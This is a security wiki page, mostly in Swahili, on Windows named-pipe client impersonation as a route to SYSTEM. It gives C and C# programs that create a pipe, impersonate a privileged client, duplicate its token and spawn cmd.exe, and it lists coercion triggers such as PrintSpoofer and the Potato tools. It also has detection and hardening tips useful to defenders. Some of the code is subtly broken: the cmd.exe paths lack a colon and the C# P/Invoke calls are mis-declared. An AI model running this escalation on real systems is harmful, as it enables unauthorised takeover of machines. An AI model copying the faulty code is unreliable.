# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation ni primitive ya local privilege escalation inayoruhusu thread ya server ya named-pipe kuchukua muktadha wa usalama wa mteja anayejunga nayo. Kwa vitendo, mshambuliaji anayeweza kuendesha code akiwa na SeImpersonatePrivilege anaweza kulazimisha mteja wenye vibali (mfano, huduma ya SYSTEM) kuungana na pipe inayodhibitiwa na mshambuliaji, kuita ImpersonateNamedPipeClient, kufanya nakala ya tokeni inayopatikana kuwa tokeni ya msingi, na kuanzisha mchakato kama mteja (kwa kawaida NT AUTHORITY\SYSTEM).

Ukurasa huu unazingatia mbinu kuu. Kwa mnyororo wa eksploit end-to-end unaolazimisha SYSTEM kuungana na pipe yako, angalia kurasa za familia ya Potato zilizotajwa hapa chini.

## TL;DR
- Unda named pipe: \\.\pipe\<random> na subiri muunganisho.
- Fanya kipengele chenye vibali kiungane nayo (spooler/DCOM/EFSRPC/etc.).
- Soma angalau ujumbe mmoja kutoka kwenye pipe, kisha ita ImpersonateNamedPipeClient.
- Fungua tokeni ya impersonation kutoka kwenye thread ya sasa, DuplicateTokenEx(TokenPrimary), na tumia CreateProcessWithTokenW/CreateProcessAsUser kupata mchakato wa SYSTEM.

## Mahitaji na API kuu
- Vibali vinavyohitajika kawaida na mchakato/thread inayoitisha:
- SeImpersonatePrivilege ili kufanikiwa kufanya impersonation kwa mteja anayejunga na pia kutumia CreateProcessWithTokenW.
- Mbali na hilo, baada ya kufanya impersonation ya SYSTEM, unaweza kutumia CreateProcessAsUser, ambayo inaweza kuhitaji SeAssignPrimaryTokenPrivilege na SeIncreaseQuotaPrivilege (hivi vinatimizwa unapokuwa unafanya impersonation ya SYSTEM).
- API kuu zinazotumika:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (lazima usome angalau ujumbe mmoja kabla ya impersonation)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: ili kufanya vitendo vinavyofaa kwa localhost, mteja lazima aeruhusu SecurityImpersonation (chaguo-msingi kwa RPC/named-pipe clients wengi wa ndani). Wateja wanaweza kupunguza haya kwa kutumia SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION wakati wa kufungua pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Vidokezo:
- Kama ImpersonateNamedPipeClient inarudisha ERROR_CANNOT_IMPERSONATE (1368), hakikisha unasoma kutoka kwenye pipe kwanza na kwamba mteja hakuzuia impersonation hadi Identification level.
- Pendelea kutumia DuplicateTokenEx pamoja na SecurityImpersonation na TokenPrimary ili kuunda token ya msingi inayofaa kwa uundaji wa process.

## .NET mfano mfupi
Katika .NET, NamedPipeServerStream inaweza kufanya impersonate kupitia RunAsClient. Mara ikipofanya impersonate, nakili token ya thread na unda mchakato.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Vichocheo/vyenye kulazimisha vya kawaida ili kupata SYSTEM kwenye pipe yako
Mbinu hizi hulazimisha huduma zilizo na ruhusa za juu kuungana na named pipe yako ili uweze impersonate zao:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Tazama matumizi ya kina na ulinganifu hapa:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Ikiwa unahitaji mfano kamili wa kutengeneza pipe na impersonating ili spawn SYSTEM kutoka kwa service trigger, angalia:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Utatuzi wa matatizo na mambo ya kuzingatia
- Unapaswa kusoma angalau ujumbe mmoja kutoka kwenye pipe kabla ya kuita ImpersonateNamedPipeClient; vinginevyo utapata ERROR_CANNOT_IMPERSONATE (1368).
- Ikiwa client inaungana kwa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server haiwezi ku-impersonate kikamilifu; angalia kiwango cha impersonation cha token kupitia GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW inahitaji SeImpersonatePrivilege kwa caller. Ikiwa hiyo itashindwa na ERROR_PRIVILEGE_NOT_HELD (1314), tumia CreateProcessAsUser baada ya tayari ku-impersonate SYSTEM.
- Hakikisha security descriptor ya pipe yako inaruhusu service lengwa kuungana ikiwa umeilinda; kwa chaguo-msingi, pipes chini ya \\.\pipe zinapatikana kulingana na DACL ya server.

## Utambuzi na kuimarisha
- Monitor named pipe creation and connections. Sysmon Event IDs 17 (Pipe Created) na 18 (Pipe Connected) ni muhimu kwa kuweka msingi wa majina halali ya pipe na kugundua pipes zisizo za kawaida, zenye kuonekana nasibu, zinazotangulia matukio ya token-manipulation.
- Tazama mfululizo: process inaunda pipe, service ya SYSTEM inaungana, kisha process iliyounda inatoa mtoto kama SYSTEM.
- Punguza exposure kwa kuondoa SeImpersonatePrivilege kutoka kwa akaunti za service zisizo muhimu na kuepuka logon za service zisizo za lazima zenye ruhusa za juu.
- Defensive development: unapojiunga na named pipes zisizo za kuaminika, weka SECURITY_SQOS_PRESENT pamoja na SECURITY_IDENTIFICATION ili kuzuia servers ku-impersonate kikamilifu client isipokuwa itakapotakiwa.

## Marejeo
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
